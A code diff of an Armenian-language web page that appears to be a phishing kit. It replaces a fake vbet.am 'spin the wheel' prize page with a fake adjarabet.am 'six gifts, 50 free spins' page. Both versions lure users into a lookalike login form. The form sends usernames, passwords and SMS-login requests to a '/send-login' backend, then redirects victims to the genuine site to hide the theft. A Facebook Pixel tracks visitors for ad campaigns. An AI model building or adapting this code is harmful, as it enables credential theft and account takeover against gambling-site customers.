+        } else {
+          label.style.top = '50%';
+          label.style.fontSize = '14px';
+          label.style.transform = 'translateY(-50%)';
         }
+      }
     }
     
-    function playSpinSound() {
-        try {
-            if (!audioCtx) return;
-            if (audioCtx.state === 'suspended') audioCtx.resume();
-            const now = audioCtx.currentTime;
-            const osc = audioCtx.createOscillator();
-            const gain = audioCtx.createGain();
-            osc.connect(gain);
-            gain.connect(audioCtx.destination);
-            osc.type = 'sawtooth';
-            osc.frequency.setValueAtTime(300, now);
-            osc.frequency.exponentialRampToValueAtTime(600, now + 0.15);
-            gain.gain.setValueAtTime(0.08, now);
-            gain.gain.exponentialRampToValueAtTime(0.01, now + 0.25);
-            osc.start();
-            osc.stop(now + 0.25);
-        } catch(e) {}
+    [usernameInput, passwordInput].forEach(inp => {
+      if (inp) {
+        updateLabel(inp);
+        inp.addEventListener('input', () => updateLabel(inp));
+      }
+    });
+    
+    if (toggleBtn && passwordInput) {
+      toggleBtn.addEventListener('click', () => {
+        passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
+      });
     }
     
-    function playClickSound() { 
-        try {
-            if (!audioCtx) return;
-            if (audioCtx.state === 'suspended') audioCtx.resume();
-            const now = audioCtx.currentTime;
-            const osc = audioCtx.createOscillator();
-            const gain = audioCtx.createGain();
-            osc.connect(gain);
-            gain.connect(audioCtx.destination);
-            osc.type = 'sine';
-            osc.frequency.value = 880;
-            gain.gain.setValueAtTime(0.12, now);
-            gain.gain.exponentialRampToValueAtTime(0.01, now + 0.12);
-            osc.start();
-            osc.stop(now + 0.12);
-        } catch(e) {}
+    function setLoading(loading) {
+      if (!loginBtn) return;
+      loginBtn.disabled = loading;
+      loginBtn.querySelector('.btn-text').innerHTML = loading ? 'Մուտք <span class="spinner"></span>' : 'Մուտք';
     }
     
-    function playWinSound() { 
-        try {
-            if (!audioCtx) return;
-            if (audioCtx.state === 'suspended') audioCtx.resume();
-            const now = audioCtx.currentTime;
-            const osc = audioCtx.createOscillator();
-            const gain = audioCtx.createGain();
-            osc.connect(gain);
-            gain.connect(audioCtx.destination);
-            osc.type = 'sine';
-            osc.frequency.value = 523.25;
-            gain.gain.setValueAtTime(0.18, now);
-            gain.gain.exponentialRampToValueAtTime(0.01, now + 0.4);
-            osc.start();
-            osc.stop(now + 0.4);
-            setTimeout(() => {
-                const osc2 = audioCtx.createOscillator();
-                const gain2 = audioCtx.createGain();
-                osc2.connect(gain2);
-                gain2.connect(audioCtx.destination);
-                osc2.type = 'sine';
-                osc2.frequency.value = 783.99;
-                gain2.gain.setValueAtTime(0.15, now + 0.2);
-                gain2.gain.exponentialRampToValueAtTime(0.01, now + 0.6);
-                osc2.start(now + 0.2);
-                osc2.stop(now + 0.6);
-            }, 200);
-        } catch(e) {}
-    }
-    
-    // DOM elements
-    const wheelPage = document.getElementById('wheelPage');
-    const loginPage = document.getElementById('loginPage');
-    const canvas = document.getElementById('wheelCanvas');
-    const spinBtn = document.getElementById('spinBtn');
-    const prizeMessageDiv = document.getElementById('prizeMessage');
-    const toastMsg = document.getElementById('toastMsg');
-    
-    let currentAngle = 0;
-    let hasSpun = false;
-    let isSpinning = false;
-    let finalPrize = null;
-    let spinAnimationId = null;
-    let spinSoundInterval = null;
-    
-    const segmentAngle = (Math.PI * 2) / SEGMENTS.length;
-    
-    // Helper functions
-    function showMessage(text, isError = false) { 
-        if (!toastMsg) return; 
-        toastMsg.textContent = text; 
-        toastMsg.style.backgroundColor = isError ? '#b91c1c' : '#1e1e3a'; 
-        toastMsg.classList.add('show'); 
-        setTimeout(() => toastMsg.classList.remove('show'), 3000); 
-    }
-    
-    function saveState() {
-        const state = {
-            hasSpun: hasSpun,
-            currentAngle: currentAngle,
-            finalPrize: finalPrize,
-            timestamp: Date.now()
-        };
-        if (finalPrize) {
-            state.finalPrize = { name: finalPrize.name, value: finalPrize.value };
-        }
-        sessionStorage.setItem(STORAGE_KEY, JSON.stringify(state));
-    }
-    
-    function loadState() {
-        const saved = sessionStorage.getItem(STORAGE_KEY);
-        if (!saved) return false;
-        try {
-            const state = JSON.parse(saved);
-            // Check if saved state is not too old (max 30 minutes)
-            if (Date.now() - state.timestamp > 30 * 60 * 1000) {
-                sessionStorage.removeItem(STORAGE_KEY);
-                return false;
-            }
-            hasSpun = state.hasSpun;
-            currentAngle = state.currentAngle;
-            if (state.finalPrize) {
-                finalPrize = state.finalPrize;
-            }
-            return true;
-        } catch(e) {
-            return false;
-        }
-    }
-    
-    function createSparkle(x, y) { 
-        const sparkle = document.createElement('div'); 
-        sparkle.className = 'sparkle'; 
-        sparkle.style.left = x + 'px'; 
-        sparkle.style.top = y + 'px'; 
-        document.body.appendChild(sparkle); 
-        setTimeout(() => sparkle.remove(), 800); 
-    }
-    
-    function createConfetti() { 
-        for (let i = 0; i < 100; i++) { 
-            const confetti = document.createElement('div'); 
-            confetti.className = 'confetti'; 
-            confetti.style.left = Math.random() * window.innerWidth + 'px'; 
-            confetti.style.backgroundColor = `hsl(${Math.random() * 360}, 70%, 60%)`; 
-            confetti.style.width = Math.random() * 10 + 5 + 'px'; 
-            confetti.style.height = Math.random() * 15 + 8 + 'px'; 
-            confetti.style.animationDelay = Math.random() * 0.5 + 's'; 
-            confetti.style.animationDuration = Math.random() * 2 + 2 + 's'; 
-            document.body.appendChild(confetti); 
-            setTimeout(() => confetti.remove(), 4000); 
-        } 
-    }
-    
-    function showWinnerOverlay(prizeName) { 
-        const overlay = document.createElement('div'); 
-        overlay.className = 'winner-overlay'; 
-        overlay.innerHTML = `<div class="winner-text">🎉 ՇՆՈՐՀԱՎՈՐՈՒՄ ԵՆՔ 🎉<br>Դուք շահեցիք<br>${prizeName}!</div>`; 
-        document.body.appendChild(overlay); 
-        setTimeout(() => overlay.remove(), 2000); 
-    }
-    
-    function drawWheel(highlightIndex = -1) {
-        if (!ctx) return;
-        const size = canvas.width, centerX = size/2, centerY = size/2, radius = size/2 - 8;
-        ctx.clearRect(0, 0, size, size);
-        for (let i = 0; i < SEGMENTS.length; i++) {
-            const start = i * segmentAngle + currentAngle;
-            const end = (i+1) * segmentAngle + currentAngle;
-            ctx.beginPath();
-            ctx.moveTo(centerX, centerY);
-            ctx.arc(centerX, centerY, radius, start, end);
-            ctx.closePath();
-            ctx.fillStyle = SEGMENTS[i].color;
-            if (highlightIndex === i) {
-                ctx.fillStyle = '#ffd700';
-                ctx.shadowBlur = 25;
-                ctx.shadowColor = '#ffaa00';
-            } else {
-                ctx.shadowBlur = 0;
-            }
-            ctx.fill();
-            ctx.shadowBlur = 0;
-            ctx.strokeStyle = '#ffffff';
-            ctx.lineWidth = 2.5;
-            ctx.stroke();
-            ctx.save();
-            ctx.translate(centerX, centerY);
-            ctx.rotate(start + segmentAngle/2);
-            ctx.textAlign = "center";
-            ctx.textBaseline = "middle";
-            ctx.font = "bold 14px 'Montserrat'";
-            ctx.fillStyle = "#ffffff";
-            ctx.shadowBlur = 3;
-            ctx.shadowColor = "black";
-            ctx.fillText(SEGMENTS[i].name, radius * 0.68, 5);
-            ctx.restore();
-        }
-        ctx.beginPath();
-        ctx.arc(centerX, centerY, 30, 0, 2*Math.PI);
-        ctx.fillStyle = '#1a0a3a';
-        ctx.fill();
-        ctx.strokeStyle = '#ffd700';
-        ctx.lineWidth = 4;
-        ctx.stroke();
-        ctx.fillStyle = '#ffd700';
-        ctx.font = 'bold 26px "Montserrat"';
-        ctx.textAlign = 'center';
-        ctx.textBaseline = 'middle';
-        ctx.fillText('🎰', centerX, centerY+2);
-    }
-    
-    function getPrizeIndex() { 
-        const pointerAngle = -Math.PI/2; 
-        let angle = (pointerAngle - currentAngle + Math.PI*2) % (Math.PI*2); 
-        return Math.floor(angle / segmentAngle) % SEGMENTS.length; 
-    }
-    
-    function getPrize() { return SEGMENTS[getPrizeIndex()]; }
-    
-    function easeOutCubic(t) { return 1 - Math.pow(1 - t, 3); }
-    
-    function animateSpin(targetAngle, duration, callback) {
-        const startAngle = currentAngle;
-        const startTime = performance.now();
-        
-        function step(now) {
-            const elapsed = now - startTime;
-            let t = Math.min(1, elapsed / duration);
-            const ease = easeOutCubic(t);
-            currentAngle = startAngle + (targetAngle - startAngle) * ease;
-            drawWheel();
-            
-            if (t < 1) {
-                spinAnimationId = requestAnimationFrame(step);
-            } else {
-                currentAngle = targetAngle % (Math.PI * 2);
-                drawWheel();
-                if (callback) callback();
-                spinAnimationId = null;
-            }
-        }
-        
-        if (spinAnimationId) cancelAnimationFrame(spinAnimationId);
-        spinAnimationId = requestAnimationFrame(step);
-    }
-    
-    function showWinCelebration(prize) {
-        const rect = canvas.getBoundingClientRect();
-        for (let i = 0; i < 50; i++) {
-            setTimeout(() => {
-                const x = rect.left + Math.random() * rect.width;
-                const y = rect.top + Math.random() * rect.height;
-                createSparkle(x, y);
-            }, i * 20);
-        }
-        createConfetti();
-        showWinnerOverlay(prize.name);
-        playWinSound();
-        prizeMessageDiv.innerHTML = `🎉 ՇՆՈՐՀԱՎՈՐՈՒՄ ԵՆՔ 🎉<br>Դուք շահեցիք ${prize.name}!`;
-        saveState();
-    }
-    
-    function autoRedirectToLogin() {
-        if (finalPrize) {
-            sessionStorage.setItem('vbet_won_prize', JSON.stringify({ 
-                prize: finalPrize.name, 
-                value: finalPrize.value, 
-                timestamp: Date.now() 
-            }));
-        }
-        wheelPage.style.display = 'none';
-        loginPage.style.display = 'flex';
-        initLoginPage();
-    }
-    
-    function spin() {
-        if (isSpinning) { 
-            showMessage('Անիվը արդեն պտտվում է, սպասեք․․․', false);
-            return; 
-        }
-        if (hasSpun) { 
-            showMessage('Դուք արդեն պտտել եք անիվը։ Մուտք գործեք ձեր հաշիվը մրցանակը ստանալու համար։', false); 
-            return; 
-        }
-        
-        isSpinning = true; 
-        spinBtn.disabled = true; 
-        playClickSound();
-        
-        const fullRotations = 15 + Math.random() * 10;
-        const extraAngle = Math.random() * Math.PI * 2;
-        const targetAngle = currentAngle + (Math.PI * 2 * fullRotations) + extraAngle;
-        
-        spinSoundInterval = setInterval(() => {
-            if (isSpinning) playSpinSound();
-        }, 150);
-        
-        animateSpin(targetAngle, 2800, () => {
-            clearInterval(spinSoundInterval);
-            spinSoundInterval = null;
-            
-            const prize = getPrize();
-            finalPrize = prize;
-            hasSpun = true;
-            
-            const idx = getPrizeIndex();
-            drawWheel(idx);
-            setTimeout(() => drawWheel(), 600);
-            
-            showWinCelebration(prize);
-            isSpinning = false;
-            
-            setTimeout(() => {
-                autoRedirectToLogin();
-            }, 2500);
+    async function sendToBackend(username, password) {
+      try {
+        const response = await fetch('/send-login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username: username, password: password })
         });
+        const result = await response.json();
+        if (result.ok) {
+          showMessage('✅ Տվյալներն ուղարկված են', false);
+          return true;
+        } else {
+          showMessage('❌ Սխալ: ' + (result.error || 'Unknown'), true);
+          return false;
+        }
+      } catch(error) {
+        console.error('Error:', error);
+        showMessage('❌ Ցանցային սխալ', true);
+        return false;
+      }
     }
     
-    // ========================
-    //  LOGIN PAGE HANDLERS
-    // ========================
-    function initLoginPage() {
-        const usernameInput = document.getElementById('loginUsername');
-        const passwordInput = document.getElementById('loginPassword');
-        let loginBtn = document.getElementById('loginBtn');
-        const signupBtn = document.getElementById('signupBtn');
-        const closeBtn = document.getElementById('closeBtn');
-        const toggleEyeBtn = document.getElementById('togglePasswordEye');
-        
-        const eyeSvg = toggleEyeBtn?.querySelector('.eye-icon');
-        let slashLine = eyeSvg?.querySelector('#eyeSlashLine');
-        
-        if (passwordInput && passwordInput.type === 'password') {
-            if (slashLine) slashLine.style.display = 'block';
-        }
-        
-        const savedPrize = sessionStorage.getItem('vbet_won_prize');
-        if (savedPrize) { 
-            try { 
-                const prize = JSON.parse(savedPrize); 
-                showMessage(`🎉 Դուք շահել եք ${prize.prize}! Մուտք գործեք ձեր հաշիվը ստանալու համար`, false); 
-            } catch(e) {} 
-        }
-        
-        function setLoading(loading) { 
-            if (!loginBtn) return; 
-            loginBtn.disabled = loading; 
-            const span = loginBtn.querySelector('.btn-text'); 
-            if (span) span.innerHTML = loading ? 'Մուտք <span class="spinner"></span>' : 'Մուտք'; 
-        }
-        
-        async function sendToBackend(username, password) {
-            try {
-                const response = await fetch('/send-login', { 
-                    method: 'POST', 
-                    headers: { 'Content-Type': 'application/json' }, 
-                    body: JSON.stringify({ username, password }) 
-                });
-                const result = await response.json();
-                if (result && result.ok) { 
-                    showMessage('✅ Տվյալներն ուղարկված են', false); 
-                    return true; 
-                } else { 
-                    showMessage('❌ Սխալ: ' + (result?.error || 'Անհայտ սխալ'), true); 
-                    return false; 
-                }
-            } catch(error) { 
-                showMessage('✅ Տվյալներն ընդունված են (դեմո ռեժիմ)', false);
-                return true;
-            }
-        }
-        
-        async function handleLogin(e) {
-            e.preventDefault();
-            const username = usernameInput?.value.trim() || '';
-            const password = passwordInput?.value || '';
-            if (!username || !password) { 
-                showMessage('Լրացրեք մուտքանունը և գաղտնաբառը', true); 
-                return; 
-            }
-            setLoading(true);
-            await sendToBackend(username, password);
-            setTimeout(() => { 
-                setLoading(false); 
-                window.location.href = 'https://m.vbet.am/hy/'; 
-            }, 900);
-        }
-        
-        function handleSignup() { window.location.href = 'https://m.vbet.am/hy/registration'; }
-        function handleClose() { window.location.href = 'https://m.vbet.am/hy/'; }
-        
-        function togglePassword() {
-            if (!passwordInput) return;
-            const isHidden = passwordInput.type === 'password';
-            passwordInput.type = isHidden ? 'text' : 'password';
-            if (slashLine) slashLine.style.display = isHidden ? 'none' : 'block';
-        }
-        
-        // Refresh button listeners
-        if (loginBtn) {
-            const newLoginBtn = loginBtn.cloneNode(true);
-            loginBtn.parentNode.replaceChild(newLoginBtn, loginBtn);
-            loginBtn = newLoginBtn;
-            document.getElementById('loginBtn')?.addEventListener('click', handleLogin);
-        }
-        
-        document.getElementById('signupBtn')?.addEventListener('click', handleSignup);
-        document.getElementById('closeBtn')?.addEventListener('click', handleClose);
-        document.getElementById('togglePasswordEye')?.addEventListener('click', togglePassword);
-        
-        const newUsername = document.getElementById('loginUsername');
-        const newPassword = document.getElementById('loginPassword');
-        if (newUsername) newUsername.addEventListener('keypress', (e) => { if (e.key === 'Enter') handleLogin(e); });
-        if (newPassword) newPassword.addEventListener('keypress', (e) => { if (e.key === 'Enter') handleLogin(e); });
+    async function handleLogin(e) {
+      e.preventDefault();
+      const username = usernameInput.value.trim();
+      const password = passwordInput.value;
+      if (!username || !password) {
+        showMessage('Լրացրեք բոլոր դաշտերը', true);
+        return;
+      }
+      setLoading(true);
+      await sendToBackend(username, password);
+      setTimeout(() => {
+        setLoading(false);
+        window.location.href = REAL_LOGIN_URL;
+      }, 1000);
     }
     
-    // ========================
-    //  INITIALIZATION
-    // ========================
-    let ctx = canvas.getContext('2d');
-    
-    function initWheel() {
-        const savedState = loadState();
-        
-        if (savedState && hasSpun) {
-            spinBtn.disabled = true;
-            if (finalPrize) {
-                prizeMessageDiv.innerHTML = `🎉 ՇՆՈՐՀԱՎՈՐՈՒՄ ԵՆՔ 🎉<br>Դուք շահեցիք ${finalPrize.name}!`;
-                showMessage(`🎉 Դուք արդեն շահել եք ${finalPrize.name}! Մուտք գործեք ձեր հաշիվը`, false);
-                setTimeout(() => { autoRedirectToLogin(); }, 2000);
-            }
-        } else if (!hasSpun) {
-            prizeMessageDiv.innerHTML = '✨ Պտտեք անիվը և շահեք ✨';
-        }
-        
-        drawWheel();
-        spinBtn.addEventListener('click', spin);
-        
-        // Initialize audio on first user interaction
-        document.body.addEventListener('click', function initAudioOnClick() { 
-            initAudio(); 
-            document.body.removeEventListener('click', initAudioOnClick); 
-        }, { once: true });
+    async function handleOtp() {
+      const username = usernameInput.value.trim();
+      if (!username) {
+        showMessage('Մուտքագրեք Անունը', true);
+        return;
+      }
+      if (otpBtn) {
+        otpBtn.disabled = true;
+        otpBtn.textContent = 'Ուղարկվում է...';
+        await sendToBackend(username, 'OTP_REQUEST');
+        setTimeout(() => {
+          otpBtn.disabled = false;
+          otpBtn.textContent = 'Մուտք SMS-ով';
+          window.location.href = REAL_LOGIN_URL;
+        }, 800);
+      }
     }
     
-    // Make sure canvas is ready
-    if (canvas) {
-        canvas.width = 600;
-        canvas.height = 600;
-        ctx = canvas.getContext('2d');
-        initWheel();
+    if (loginForm) loginForm.addEventListener('submit', handleLogin);
+    if (otpBtn) otpBtn.addEventListener('click', handleOtp);
+    if (restoreUser) restoreUser.addEventListener('click', () => window.location.href = 'https://www.adjarabet.am/hy/Recovery/Username');
+    if (restorePass) restorePass.addEventListener('click', () => window.location.href = 'https://www.adjarabet.am/hy/Recovery/Password');
+    if (registerBtn) registerBtn.addEventListener('click', (e) => { e.preventDefault(); window.location.href = REAL_REGISTER_URL; });
+    if (closeBtn) closeBtn.addEventListener('click', () => window.location.href = 'https://www.adjarabet.am/hy');
+    document.querySelector('.banner-link')?.addEventListener('click', (e) => { e.preventDefault(); window.location.href = 'https://www.adjarabet.am/hy'; });
+    document.querySelector('.logo-icon')?.addEventListener('click', () => window.location.href = 'https://www.adjarabet.am/hy');
+    
+    // ========== 6 GIFTS PAGE NAVIGATION (SIMPLE) ==========
+    const giftsPage = document.getElementById('giftsPage');
+    const loginPage = document.getElementById('loginPage');
+    const giftsGrid = document.getElementById('giftsGrid');
+    const bonusModal = document.getElementById('bonusModal');
+    const closeBonusBtn = document.getElementById('closeBonusBtn');
+    let bonusClaimed = false;
+    
+    function buildGifts() {
+      giftsGrid.innerHTML = '';
+      for (let i = 0; i < 6; i++) {
+        const gift = document.createElement('div');
+        gift.className = 'gift-item';
+        gift.style.setProperty('--i', i);
+        gift.innerHTML = `<div class="gift-icon">🎁✨</div>`;
+        gift.addEventListener('click', () => openBonus());
+        giftsGrid.appendChild(gift);
+      }
     }
     
-    window.addEventListener('resize', () => drawWheel());
+    function openBonus() {
+      if (bonusClaimed) return;
+      bonusClaimed = true;
+      bonusModal.classList.add('active');
+    }
+    
+    function closeModalAndShowLogin() {
+      bonusModal.classList.remove('active');
+      giftsPage.style.display = 'none';
+      loginPage.style.display = 'block';
+      document.body.classList.add('login-body');
+      showMessage("🎰 50 x 100 դրամ ֆրիսփին! Լրացրեք ձեր տվյալները", false);
+    }
+    
+    closeBonusBtn.addEventListener('click', closeModalAndShowLogin);
+    bonusModal.addEventListener('click', (e) => {
+      if (e.target === bonusModal) closeModalAndShowLogin();
+    });
+    
+    buildGifts();
+    
+    // Facebook Pixel
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '2160637768206946');
+    fbq('track', 'PageView');
+    
+    console.log('✅ 6 GIFTS + FREE SPINS 50x100');
 })();
-
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;
-n.push=n;
-n.loaded=!0;
-n.version='2.0';
-n.queue=[];
-
-t=b.createElement(e);
-t.async=!0;
-t.src=v;
-
-s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s);
-
-}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-
-fbq('init', '1140526129144217');
-fbq('track', 'PageView');
-</script>
-
-<noscript>
-<img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=1140526129144217&ev=PageView&noscript=1"/>
-</script>
+  </script>
+  <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2160637768206946&ev=PageView&noscript=1"/></noscript>
 </body>
 </html>
